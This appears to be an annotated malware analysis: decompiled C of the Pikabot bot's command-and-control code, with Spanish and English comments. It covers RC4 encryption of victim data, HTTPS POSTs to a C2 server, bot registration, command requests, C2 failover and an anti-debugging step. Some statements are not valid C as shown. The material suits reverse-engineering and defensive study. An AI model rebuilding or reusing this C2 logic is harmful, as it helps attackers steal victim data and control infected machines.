
int __cdecl HTTP_communicate(undefined4 *victim_info, int *response_data_ptr)

{
  if (*(int *)(_pikabot_struct + 0x178) == 0) { // Next_concatIPData == ultima
    call_exit_user_proc();
  }

  if (*(int *)(_pikabot_struct + 4) == 0) {
    HTTPsessionID = (**(code **)(_pikabot_struct + 0x100))(*(undefined4 *)(_pikabot_struct + 0x194), 1, 0, 0, 0);
    /*
    WINHTTPAPI HINTERNET WinHttpOpen(
    [in, optional] LPCWSTR pszAgentW, ->  _pikabot_struct + 0x194 = user_agent
    [in]           DWORD   dwAccessType, ->  1 = WINHTTP_ACCESS_TYPE_NO_PROXY
    [in]           LPCWSTR pszProxyW,
    [in]           LPCWSTR pszProxyBypassW,
    [in]           DWORD   dwFlags
    );
    ret -> Devuelve un identificador de sesión válido si es correcto o NULL de lo contrario
    */
    *(undefined4 *)(structPika + 4) = HTTPsessionID;
    if (*(int *)(_pikabot_struct + 4) != 0) goto LAB_00a84854;
  } else {
LAB_00a84854:
    Next_concatIPData = (undefined4 *)**(int **)(_pikabot_struct + 0x178);

    connectionID = (**(code **)(_pikabot_struct + 0x104))
                        (*(undefined4 *)(_pikabot_struct + 4),
                        Next_concatIPData,
                        *(undefined2 *)(*(int **)(_pikabot_struct + 0x178) + 1),
                        0);
    /*
    WINHTTPAPI HINTERNET WinHttpConnect(
        [in] HINTERNET     hSession,
        [in] LPCWSTR       pswzServerName, -> Puntero a un cadena terminadanull que contiene el nombre de host de un servidor HTTP. Como alternativa, la cadena puede contener la dirección IP del sitio como una cadena
        [in] INTERNET_PORT nServerPort,
        [in] DWORD         dwReserved -> reservado, debe ser 0
        );
    ret -> Devuelve un identificador de conexión válido a la sesión HTTP si la conexión es correcta o NULL de lo contrario
    */
    if (connectionID != 0) {

      uri_ptr = *(int *)(_pikabot_struct + 0x198);
      for (uri_count = 0; *(int *)(uri_ptr + uri_count * 4) != 0; uri_count = uri_count + 1) {}

      ranN = getNonZero_RandomNumber();
      flags = 0x100; // WINHTTP_FLAG_SECURE
      if (*(int *)(*(int *)(_pikabot_struct + 0x178) + 8) != 0) {
        flags = 0x800100; // WINHTTP_FLAG_SECURE | WINHTTP_FLAG_ESCAPE_DISABLE
      }
      http_req_handle = (**(code **)(_pikabot_struct + 0x108))
                         (connectionID,
                         "POST",
                         *(undefined4 *)(structPika + (ranN % uri_count) * 4),
                         0, 0, 0, flags);
        /*
        WINHTTPAPI HINTERNET WinHttpOpenRequest(
            [in] HINTERNET hConnect,
            [in] LPCWSTR   pwszVerb,
            [in] LPCWSTR   pwszObjectName, -> Pointer to a string that contains the name of the target resource of the specified HTTP verb.
            [in] LPCWSTR   pwszVersion,
            [in] LPCWSTR   pwszReferrer,
            [in] LPCWSTR   *ppwszAcceptTypes,
            [in] DWORD     dwFlags
            );
            dwFlags: 
                WINHTTP_FLAG_SECURE : use SSL with TLS
                WINHTTP_FLAG_ESCAPE_DISABLE : Unsafe characters in the URL passed in for pwszObjectName are not converted to escape sequences.
        ret -> Returns a valid HTTP request handle if successful, or NULL if not
        */
      if (http_req_handle != 0) {

        if (*(int *)(*(int *)(_pikabot_struct + 0x178) + 8) != 0) {
          lpBuffer = 0x3300;
          (**(code **)(_pikabot_struct + 0x10c))(http_req_handle, 0x1f,&lpBuffer,4);
          /*
            WINHTTPAPI BOOL WinHttpSetOption(
              [in] HINTERNET hInternet,
              [in] DWORD     dwOption, -> 0x1f = WINHTTP_OPTION_ENABLE_FEATURE: Establece un valor entero largo sin signo que especifica las características habilitadas actualmente
              [in] LPVOID    lpBuffer, -> 0x3300 = WINHTTP_ENABLE_SSL_REVERT_IMPERSONATION | WINHTTP_ENABLE_SSL_REVOCATION
              [in] DWORD     dwBufferLength
            );
            ret -> Devuelve TRUE si se ejecuta correctamente o FALSE de lo contrario.
          */
        }

        i = 0;
        http_header = 1; 
        while( http_header != 0 ) {
          http_header = *(int *)(*(int *)(_pikabot_struct + 0x19c) + i); // HTTPheaders_ptr + i
          (**(code **)(_pikabot_struct + 0x110))(http_req_handle, http_header, 0xffffffff, 0x20000000);
          /*
          WINHTTPAPI BOOL WinHttpAddRequestHeaders(
            [in] HINTERNET hRequest,
            [in] LPCWSTR   lpszHeaders,
            [in] DWORD     dwHeadersLength, -> Si este parámetro es -1L, la función asume que pwszHeaders está terminada en cero (ASCIIZ) y se calcula la longitud.
            [in] DWORD     dwModifiers -> 0x20000000 = WINHTTP_ADDREQ_FLAG_REPLACE : Reemplaza o quita un encabezado. Si el valor del encabezado está vacío y se encuentra el encabezado, se quita. Si el valor no está vacío, se reemplaza.
          );
          */
          i = i + 4;
        }
// ---------------------------------------------> hasta aqui se ejecuta correctamente, no necesitamos internet para que furule
        puVar21 = 0x0;
        ret = (**(code **)(_pikabot_struct + 0x114))(http_req_handle, 0, 0, *victim_info, victim_info + 0x4, victim_info + 0x8, 0);
        /*
        WINHTTPAPI BOOL WinHttpSendRequest(
          [in]           HINTERNET hRequest,
          [in, optional] LPCWSTR   lpszHeaders,-> NULL = 0 = no additional headers
          [in]           DWORD     dwHeadersLength,
          [in, optional] LPVOID    lpOptional, -> Puntero a un búfer que contiene los datos opcionales que se van a enviar inmediatamente después de los encabezados de solicitud
          [in]           DWORD     dwOptionalLength, -> 1291 : Valor entero largo sin signo que contiene la longitud, en bytes, de los datos opcionales
          [in]           DWORD     dwTotalLength, -> 1687 : Valor entero largo sin signo que contiene la longitud, en bytes, de los datos totales enviados
          [in]           DWORD_PTR dwContext -> 0 : Puntero a una variable de tamaño de puntero que contiene un valor definido por la aplicación que se pasa, con el identificador de solicitud, a cualquier función de devolución de llamada.
        );
        ret -> Devuelve TRUE si se ejecuta correctamente o FALSE de lo contrario.
        */
        if (ret != 0) {
          ret = (**(code **)(_pikabot_struct + 0x118))(http_req_handle, 0);
          /*
          WINHTTPAPI BOOL WinHttpReceiveResponse(
            [in] HINTERNET hRequest,
            [in] LPVOID    lpReserved -> debe ser NULL (reservado)
          );
          ret -> Devuelve TRUE si se ejecuta correctamente o FALSE de lo contrario
          */

          if ((int)ret != 0) {
            status_code = get_status_code(http_req_handle);

            if (response_data_ptr != (int *)0x0) {
              complete_readData = 0;
              i = 0;
              if (status_code == 200) {
                do {
                  ret = (**(code **)(_pikabot_struct + 0x11c))(http_req_handle, buffer_ptr, 0x400, &read_size);
                  /*
                  WINHTTPAPI BOOL WinHttpReadData(
                    [in]  HINTERNET hRequest,
                    [out] LPVOID    lpBuffer,
                    [in]  DWORD     dwNumberOfBytesToRead,
                    [out] LPDWORD   lpdwNumberOfBytesRead
                  );
                  ret -> Returns TRUE if successful, or FALSE otherwise.
                  */

                  if ((ret == 0) || (read_size == 0)) break; // read complete

                  if (complete_readData == 0) {
                    complete_readData = (**(code **)(structPika + 0x50))(0x40,read_size); // kernel32.LocalAlloc
                  } else {
                    complete_readData = (**(code **)(_pikabot_struct + 0x54))(complete_readData,read_size + i,0x42); // kernel32.LocalReAlloc
                  }
                  total_read_size = read_size + i;

                  move_Mem((undefined *)(i + complete_readData), (undefined *)buffer_ptr, read_size);
                  fillContentWithVal((int)buffer_ptr, 0, 0x400);
                  buffer_ptr = 0x0;
                  i = total_read_size;
                } while (ret == 1);

                *response_data_ptr = complete_readData;
                response_data_ptr + 0x4 = i; // total_read_size
                received_response = 1;
                goto LAB_00a84c9a;
              }
            }
          }
        }
      }
    }
  }
  received_response = 0;
  http_req_handle = 0;
  connectionID = 0;

LAB_00a84c9a:

  //  Failures
  if (*(int *)(_pikabot_struct + 4) != 0) { 
    (**(code **)(_pikabot_struct + 0x120))(*(int *)(_pikabot_struct + 4)); // winhttp.WinHttpCloseHandle
    *(undefined4 *)(_pikabot_struct + 4) = 0;
  }
  if (connectionID != 0) {
    (**(code **)(_pikabot_struct + 0x120))(connectionID); // winhttp.WinHttpCloseHandle
  }
  if (http_req_handle != 0) {
    (**(code **)(_pikabot_struct + 0x120))(http_req_handle); // winhttp.WinHttpCloseHandle
  }

  if (received_response == 0) {
    nextIP = get_nextC2(*(int *)(_pikabot_struct + 0x178));
    *(int *)(structPika + 0x178) = nextIP;
    *(undefined4 *)(structPika + 0x184) = 1;
    *(undefined4 *)(structPika + 0x188) = 2;
  } else {
    *(undefined4 *)(structPika + 0x184) = 0;
  }
  return received_response;
}

int __cdecl get_nextC2(int next_IP_ptr)
{
  if (next_IP_ptr != 0) {
    if (*(int *)(next_IP_ptr + 0xc) == *(int *)(_pikabot_struct + 0x190)) {
      // reached maximum connection attemps
      *(undefined4 *)(next_IP_ptr + 0x10) = 1; // mark IP as unavaliable
    } else {
      *(int *)(next_IP_ptr + 0xc) = *(int *)(next_IP_ptr + 0xc) + 1;
    }
    NExtC2Data = getNExtC2Data();
    return NExtC2Data;
  }
  return 0;
}


undefined4 __cdecl get_status_code(undefined4 handle)
{
  status_code = 0;
  status_code_size = 4;
  ret = (**(code **)(_pikabot_struct + 0xfc))(handle, 0x20000013, 0, &status_code, status_code_size, 0);
  /*
  WINHTTPAPI BOOL WinHttpQueryHeaders(
    [in]           HINTERNET hRequest,
    [in]           DWORD     dwInfoLevel, -> 0x20000013 = WINHTTP_QUERY_FLAG_NUMBER | WINHTTP_QUERY_STATUS_CODE : Cuando usas dwInfoLevel = 0x20000013, estás indicando que deseas obtener el código de estado HTTP de la respuesta como un valor numérico
    [in, optional] LPCWSTR   pwszName, -> 0 : al establecer dwInfoLevel como se ha hecho, este campo se ignora
    [out]          LPVOID    lpBuffer,
    [in, out]      LPDWORD   lpdwBufferLength,
    [in, out]      LPDWORD   lpdwIndex -> 0 : primera cabecera
  );
  ret -> Devuelve TRUE si es correcto o FALSE en caso contrario.
  */
  if (ret == 0) {
    status_code = 0;
  }
  return status_code;
}


int __cdecl comunicate(undefined4 victim_info,undefined4 victim_info_size, int *response_data_start, int *response_data_size)
{
  response_data = 0;
  received_response = HTTP_communicate(&victim_info, &response_data);
  if (received_response != 0) {
    if (response_data_start != (int *)0x0) {
      *response_data_start = response_data;
    }
    if (response_data_size != (undefined4 *)0x0) {
      *response_data_size = response_data + 0x4;
    }
    received_response = 1;
  }
  return received_response;
}

// algoritmo de cifrado RC4 -> https://en.wikipedia.org/wiki/RC4
void __cdecl encryptData(int key, uint  keyLength ,byte *data, int sizeOfdata)
{
  // Initialiozation S[a] = a ; a = 0 ... 255
  byte S [268] ; 
  a = 0;
  do {
    S[a] = a;
    a = a + 1;
  } while (a != 0x100);

  // KSA - Key Scheduling Algorithm
  j = 0;
  i = 0;
  do {
    Si = S[i];
    j = (key + i % keyLength ) + Si + j & 0xff;
    Sj = S[j];
    S[i] = Sj;
    S[j] = Si;
    i = i + 1;
  } while (i != 0x100);
  S[0xff] = Sj;
  S[j] = Si;

  // PRGA - Pseudo-Random Generation Algorithm
  j = 0;
  i = 0;
  for (lastVictimData = data + sizeOfdata;
        lastVictimData != data; 
        data = data + 1) 
  {
    i = i + 1 & 0xff;
    Si = S[i];
    j = Si + j & 0xff;
    S[i] = S[j];
    S[j] = Si;
    *data = *data ^ S[(Si + S[i])];
  }
  return;
}


void __cdecl encrypt_and_shift_data_1(int *data_struct)
{
  if (data_struct != (int *)0x0) {
    if (data_struct + 0x10 != 0) {
      size = 0x30;

      if (*data_struct != 0x1291) {
        size = sizeOfString(*(short **)(_pikabot_struct + 0x13c)); // bot_ID
        size = size * 2 + 0xc;
      } 
      if (data_struct + 0x8 != size) {
        encryptData(*(int *)(_pikabot_struct + 0x158),          // RC4 key
                    0x20,                                       // RC4 key length
                    (byte *)(data_struct + 0x4 + size),   // ptr to victim data
                    data_struct + 0x8 - size);            // size of victim data

        shift_and_check_DebuggerPresent(size + data_struct + 0x4,
                    data_struct + 0x8 - size);
      }
      data_struct + 0x10 = 0;
    }
  }
  return;
}

void __cdecl reset_victimInfoStruct(int victim_info_struc)
{
  if (victim_info_struc != 0) {

    // empty victimInfo
    if (*(int *)(victim_info_struc + 4) != 0) {
      fillContentWithVal(*(int *)(victim_info_struc + 4), 0, *(int *)(victim_info_struc + 8)); // fill victimInfo with 0
      (**(code **)(_pikabot_struct + 0x58))(*(undefined4 *)(victim_info_struc + 4)); // kernel32.LocalFree
      *(undefined4 *)(victim_info_struc + 4) = 0;
    }

    // empty victim info struct
    fillContentWithVal(victim_info_struc, 0, 0x20);
    (**(code **)(_pikabot_struct + 0x58))(victim_info_struc); // kernel32.LocalFree
  }
  return;
}

undefined4 __thiscall
connect2availableC2(int *info_struc, int *response_data_start, int *response_data_size)
{
  if (info_struc != (int *)0x0) {
    info = info_struc + 0x4;
    if (info == 0) {
      return 0;
    }
    fill_4Bptr((undefined *)info, info_struc + 0x8 - 4);
    encrypt_and_shift_data_1(info_struc);
    ret = comunicate(info_struc + 0x4, info_struc + 0x8, response_data_start, response_data_size);
    // ret = 1 if SUCCESS, 0 if FAILURE
    if (ret != 0) {
      reset_victimInfoStruct(info_struc);
      return 1;
    }
  }
  return 0;
}

int __fastcall registerInC2()
{
  response_data_start = 0;
  response_data_size = 0;
  ret = connect2availableC2(*_pikabot_struct, &response_data_start, &response_data_size);

  if ((ret != 0) && (response_data_start != 0)) {
    _pikabot_struct + 0x140 = (int *)0x1; // mark registered flag
    ret = 1;
  }
  return ret;
}

undefined4 * __cdecl create_commandInfo_struct(undefined4 command)
{
  ptr = allocate_info(command);
  fillNext4B((int)ptr,0);
  fillNext4B((int)ptr,*ptr);
  fill_String((int)ptr,*(short **)(_pikabot_struct + 0x13c));
  return ptr;
}

void __cdecl request_command(int *resp_start,undefined4 *resp_size)
{
  command_info_struc = create_commandInfo_struct(0x164);
  ret = connect2availableC2(command_info_struc, resp_start, resp_size);
  return ret;
}

bool availableIPsExist(void)
{
  NExtC2Data = *(int *)(_pikabot_struct + 0x17c);
  do {
    if (NExtC2Data == 0) break;
    if (*(int *)(NExtC2Data + 0x10) != 0) {
      unavailable_IPs = unavailable_IPs + 1;
    }
    NExtC2Data = *(int *)(NExtC2Data + 0x14);
  } while (NExtC2Data != NExtC2Data);

  IPCount = countIPs(uVar4);
  return IPCount != unavailable_IPs;
}



void __cdecl encrypt_and_shift_data_2(int content)
{
  if (content != 0) {
    shift_and_check_DebuggerPresent(*(int *)(content + 4), *(int *)(content + 0xc));
    encryptData(*(int *)(_pikabot_struct + 0x158),       // RC4 key 
                        0x20,                            // RC4 key length   
                        *(byte **)(content + 4),         // ptr to content
                        *(int *)(content + 0xc));        // size of content
  }
  return;
}
